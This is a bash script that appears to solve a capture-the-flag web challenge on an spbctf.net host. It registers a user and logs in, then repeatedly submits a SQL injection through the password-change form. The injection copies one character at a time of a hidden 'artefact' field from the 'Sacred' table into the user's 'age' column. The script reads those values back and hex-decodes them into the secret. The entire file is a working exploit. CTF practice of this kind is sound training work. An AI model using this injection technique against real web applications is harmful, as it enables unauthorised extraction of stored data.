#!/bin/bash

user=user_$(date +%s)

curl 'https://t-fire-oudjc9cv.spbctf.net/signup' \
	-X 'POST' \
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
	--data "username=$user&password=$user"
echo

curl 'https://t-fire-oudjc9cv.spbctf.net/signin' \
	-c /tmp/ctf_cookies.txt \
	-X 'POST' \
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
	--data "username=$user&password=$user"
echo

for ((i = 1; i <= 100; i++)); do
	injection="$user', age = (SELECT CAST(ascii(SUBSTRING(encode(artefact::bytea, 'hex'), $i, 1)) AS INTEGER) FROM Sacred LIMIT 1 OFFSET 2) -- 1"

	curl -s 'https://t-fire-oudjc9cv.spbctf.net/profile/password' \
		-b /tmp/ctf_cookies.txt \
		-X 'POST' \
		--data-urlencode "password=$injection"

	age=$(curl -s 'https://t-fire-oudjc9cv.spbctf.net/profile/get' \
		-b /tmp/ctf_cookies.txt \
		-X 'GET' | jq -r '.age')

	if [ "$age" = "0" ]; then break; fi

	ch=$(echo "$age" | awk '{printf("%c", $1)}')
	echo -n "$ch"
	msg=${msg}${ch}
done

echo
echo "$msg" | xxd -r -p
echo
